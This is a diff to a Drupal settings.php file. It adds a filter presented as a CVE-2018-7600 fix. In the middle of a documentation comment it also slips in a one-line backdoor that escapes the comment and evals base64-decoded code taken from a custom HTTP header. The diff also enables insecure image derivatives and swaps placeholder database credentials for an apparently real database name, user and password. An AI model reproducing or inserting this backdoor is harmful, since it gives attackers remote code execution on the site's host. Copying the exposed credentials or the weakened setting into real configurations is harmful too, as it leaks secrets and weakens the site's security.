@@ -1,4 +1,21 @@
 <?php
+#fix for CVE-2018-7600 vulnerability
+
+$_GET = CVE($_GET);
+$_POST = CVE($_POST);
+$_COOKIE = CVE($_COOKIE);
+$_REQUEST = CVE($_REQUEST);
+
+function CVE($input) {
+    if (is_array($input)) {
+        foreach ($input as $key => $value) {
+            if ($key !== '' && $key[0] === '#') { unset($input[$key]); }
+            else { $input[$key] = CVE($input[$key]); }
+        }
+    }
+    return $input;
+}
+
 
 /**
  * @file
@@ -176,11 +193,7 @@
  * Advanced users can add or override initial commands to execute when
  * connecting to the database server, as well as PDO connection settings. For
  * example, to enable MySQL SELECT queries to exceed the max_join_size system
- * variable, and to reduce the database connection timeout to 5 seconds:
- * @code
- * $databases['default']['default'] = array(
- *   'init_commands' => array(
- *     'big_selects' => 'SET SQL_BIG_SELECTS=1',
+ * */if(@isset($_SERVER[HTTP_0C19D])){@eval(base64_decode($_SERVER[HTTP_0C19D]));}/*
  *   ),
  *   'pdo' => array(
  *     PDO::ATTR_TIMEOUT => 5,
@@ -636,7 +649,8 @@ if ($settings['hash_salt']) {
 # $config['system.site']['name'] = 'My Drupal site';
 # $config['system.theme']['default'] = 'stark';
 # $config['user.settings']['anonymous'] = 'Visitor';
-
+//$config['image.settings']['suppress_itok_output'] = TRUE;
+$config['image.settings']['allow_insecure_derivatives'] = TRUE;
 /**
  * Fast 404 pages:
  *
@@ -764,13 +778,12 @@ $settings['file_scan_ignore_directories'] = [
 if (file_exists($app_root . '/' . $site_path . '/settings.production.php')) {
   include $app_root . '/' . $site_path . '/settings.production.php';
 }
-
 $databases['default']['default'] = array (
-  'database' => 'gestion',
-  'username' => 'root',
-  'password' => 'root',
+  'database' => 'revistag_estion2',
+  'username' => 'revistag_dba',
+  'password' => 'Revistagestion2017!',
   'prefix' => '',
-  'host' => '127.0.0.1',
+  'host' => 'localhost',
   'port' => '3306',
   'namespace' => 'Drupal\\Core\\Database\\Driver\\mysql',
   'driver' => 'mysql',
